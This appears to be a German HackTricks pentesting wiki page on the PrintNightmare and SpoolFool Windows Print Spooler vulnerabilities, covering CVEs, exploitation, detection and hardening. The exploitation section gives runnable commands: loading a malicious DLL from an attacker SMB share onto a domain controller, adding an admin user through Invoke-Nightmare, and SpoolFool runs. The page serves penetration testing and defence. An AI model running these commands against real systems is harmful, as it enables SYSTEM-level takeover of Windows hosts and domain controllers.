# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ist die Sammelbezeichnung für eine Reihe von Schwachstellen im Windows-Dienst **Print Spooler**, die **beliebige Codeausführung als SYSTEM** und, wenn der Spooler über RPC erreichbar ist, **Remote Code Execution (RCE) auf Domain Controllern und File-Servern** ermöglichen. Die am häufigsten ausgenutzten CVEs sind **CVE-2021-1675** (ursprünglich als LPE eingestuft) und **CVE-2021-34527** (vollständige RCE). Nachfolgende Probleme wie **CVE-2021-34481 („Point & Print“)** und **CVE-2022-21999 („SpoolFool“)** zeigen, dass die Angriffsfläche noch lange nicht vollständig geschlossen ist.

Wenn du nach **Authentication Coercion / Relay** über den Spooler statt nach **driver-based RCE/LPE** suchst, siehe [diese andere Seite zum Missbrauch von printer coercion](printers-spooler-service-abuse.md). Diese Seite konzentriert sich auf das **Laden von Treibern / DLLs als SYSTEM**.

---

## 1. Verwundbare Komponenten & CVEs

| Jahr | CVE | Kurzname | Primitive | Hinweise |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|„PrintNightmare #1“|LPE|Im CU vom Juni 2021 gepatcht, aber durch CVE-2021-34527 umgangen|
|2021|CVE-2021-34527|„PrintNightmare“|RCE/LPE|`AddPrinterDriverEx` ermöglicht authentifizierten Benutzern, eine Treiber-DLL von einer Remote-Freigabe zu laden; nach August 2021 erfordert dies normalerweise abgeschwächte Point-&-Print-Richtlinien|
|2021|CVE-2021-34481|„Point & Print“|LPE|Installation nicht signierter Treiber durch Nicht-Administratoren|
|2022|CVE-2022-21999|„SpoolFool“|LPE|Erstellung beliebiger Verzeichnisse → DLL planting – funktioniert auch nach den Patches von 2021|

Alle nutzen eine der **MS-RPRN / MS-PAR RPC-Methoden** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) oder Vertrauensbeziehungen innerhalb von **Point & Print** aus.

## 2. Exploitation-Techniken

### 2.1 Kompromittierung eines Remote Domain Controllers (CVE-2021-34527)

Ein authentifizierter, aber **nicht privilegierter** Domain-Benutzer kann beliebige DLLs als **NT AUTHORITY\SYSTEM** auf einem Remote-Spooler (häufig dem DC) ausführen, indem er:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Beliebte PoCs umfassen **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) sowie Benjamin Delpys `misc::printnightmare / lsa::addsid`-Module in **mimikatz**.

### 2.2 Lokale privilege escalation (jedes unterstützte Windows, 2021-2024)

Dieselbe API kann **lokal** aufgerufen werden, um einen Treiber aus `C:\Windows\System32\spool\drivers\x64\3\` zu laden und SYSTEM-Rechte zu erlangen:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Moderne Triage auf gepatchten Hosts

Auf einem vollständig aktualisierten Host schlagen öffentliche PrintNightmare-PoCs häufig fehl, da Windows inzwischen standardmäßig die Installation von **Druckertreibern nur für Administratoren** erlaubt (`RestrictDriverInstallationToAdministrators=1` seit dem 10. August 2021). Bevor du einen Exploit gegen ein Ziel einsetzt, prüfe zunächst, ob die Umgebung diese Sicherheitsänderung für ältere Druckerbereitstellungen zurückgesetzt hat:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Die beiden interessantesten schwachen Werte sind normalerweise:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bestätige von Linux aus schnell, dass das Ziel die relevanten Print-RPC-Schnittstellen offenlegt, bevor du einen PoC ausführst:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Einige neuere öffentlich verfügbare Tools bieten außerdem einen sichereren **check/list**-Workflow, bevor eine DLL gesendet wird:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Wenn Sie als Benutzer mit niedrigen Privilegien `RPC_E_ACCESS_DENIED` (`0x8001011b`) erhalten, sehen Sie normalerweise das Standardverhalten nach 2021 und keinen Transportfehler.

> Unter Windows 11 22H2+ und neueren Client-Builds wird Remote Printing standardmäßig über **RPC over TCP** ausgeführt, während **RPC over named pipes** (`\PIPE\spoolss`) deaktiviert ist, sofern es nicht ausdrücklich wieder aktiviert wird. Einige ältere PoCs und Labornotizen gehen weiterhin davon aus, dass die Named Pipe erreichbar ist.

### 2.4 Missbrauch von Package Point & Print in „gepatchten“ Netzwerken

Viele Unternehmensumgebungen blieben aufgrund ihrer Richtlinien nach den ursprünglichen Patches von 2021 **verwundbar**, weil Helpdesk- oder Print-Server-Workflows weiterhin erforderten, dass Benutzer ohne Administratorrechte Treiber installieren oder aktualisieren konnten. In der Praxis sieht der offensive Ablauf folgendermaßen aus:

- Wenn Sicherheitsabfragen vollständig deaktiviert sind, ist **klassisches PrintNightmare mit beliebiger DLL** weiterhin der kürzeste Weg.
- Wenn `Only use Package Point and Print` aktiviert ist, müssen Sie normalerweise auf einen **signierten, Package-aware Driver**-Pfad ausweichen, statt eine rohe DLL abzulegen.
- Untersuchungen aus dem Jahr 2024 zeigten, dass **`Package Point and Print - Approved servers` allein keine harte Trust Boundary darstellt**: Wenn ein Angreifer die Namensauflösung für einen freigegebenen Print-Server fälschen oder übernehmen kann, können Opfer weiterhin an einen bösartigen Server umgeleitet werden, der die Richtlinienprüfungen erfüllt.
- Selbst die Kombination aus UNC-Härtung und erzwungenem RPC-over-SMB kann unzuverlässig sein, da moderne Clients möglicherweise auf **RPC over TCP** zurückfallen.

Aus diesem Grund geht es bei moderner PrintNightmare-ähnlicher Ausnutzung häufig eher um den **Missbrauch von Richtlinien für die Druckerbereitstellung in Unternehmen**, als darum, den ursprünglichen PoC von 2021 unverändert wiederzugeben.

### 2.5 SpoolFool (CVE-2022-21999) – Umgehung der Fixes von 2021

Microsofts Patches aus dem Jahr 2021 blockierten das Laden von Treibern aus der Ferne, **härteten jedoch nicht die Verzeichnisberechtigungen**. SpoolFool missbraucht den Parameter `SpoolDirectory`, um ein beliebiges Verzeichnis unter `C:\Windows\System32\spool\drivers\` zu erstellen, legt dort eine Payload-DLL ab und zwingt den Spooler, sie zu laden:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Der Exploit funktioniert auf vollständig gepatchtem Windows 7 → Windows 11 und Server 2012R2 → 2022 vor den Updates vom Februar 2022

---

## 3. Erkennung & Hunting

* **PrintService-Logs** – aktiviere den Kanal *Microsoft-Windows-PrintService/Operational* und überwache **Event ID 316** (Treiber hinzugefügt/aktualisiert, enthält normalerweise die DLL-Namen) sowohl bei erfolgreichen als auch bei fehlgeschlagenen Versuchen. Kombiniere ihn mit **Event ID 808/811** für verdächtige Fehler beim Laden von Spooler-Modulen/Treibern.
* **Sysmon** – `Event ID 7` (Image loaded) oder `11/23` (Dateischreiben/-löschen) innerhalb von `C:\Windows\System32\spool\drivers\*`, wenn der übergeordnete Prozess **spoolsv.exe** ist.
* **Prozessabstammung** – alarmiere immer dann, wenn **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell oder einen unerwarteten nicht signierten Child-Prozess startet.
* **Netzwerk-Telemetrie** – unerwartete SMB-Abrufe von `spoolsv.exe` zu von Angreifern kontrollierten Shares oder ungewöhnlicher Printer-RPC-Traffic von Servern, die nicht als Printserver fungieren sollten, sind beides aussagekräftige Ansatzpunkte.

## 4. Mitigation & Hardening

1. **Patchen!** – Wende das aktuellste kumulative Update auf jedem Windows-Host an, auf dem der Print Spooler-Dienst installiert ist.
2. **Deaktiviere den Spooler, wo er nicht benötigt wird**, insbesondere auf Domain Controllern:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blockiere Remoteverbindungen**, während lokales Drucken weiterhin möglich bleibt – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Beschränke Point & Print auf Administratoren**, indem du Folgendes setzt:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaillierte Anleitung in Microsoft KB5005652
5. Wenn geschäftliche Anforderungen `RestrictDriverInstallationToAdministrators=0` erzwingen, behandle jede andere Druckerrichtlinie nur als **partielle Mitigation**. Bevorzuge mindestens **package-aware drivers**, aktiviere **Only use Package Point and Print** und beschränke **Package Point and Print - Approved servers** auf explizit angegebene Printserver innerhalb der Forest.
6. **Setze die Printer-RPC-Privacy nicht zurück**, nur um fehlerhafte Druckerzuordnungen zu beheben. Umgebungen, die `RpcAuthnLevelPrivacyEnabled=0` setzen, machen die für **CVE-2021-1678** hinzugefügte Hardening-Maßnahme rückgängig und verdienen während eines Engagements normalerweise besondere Aufmerksamkeit.

---

## 5. Verwandte Forschung / Tools

* `mimikatz`-Module für [`printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardmäßige Impacket-Implementierung mit `-check`-, `-list`- und `-delete`-Modi
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – Wrapper mit integrierter SMB-Bereitstellung, Unterstützung mehrerer Ziele sowie `MS-RPRN`- und `MS-PAR`-Modi
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – Missbrauch eines eigenen verwundbaren Druckertreibers über package Point & Print
* SpoolFool-Exploit und Write-up
* 0patch-Micropatches für SpoolFool und andere Spooler-Bugs

Wenn du **Authentifizierung erzwingen** möchtest, statt einen Treiber über den Spooler zu laden, gehe zu [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Referenzen

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
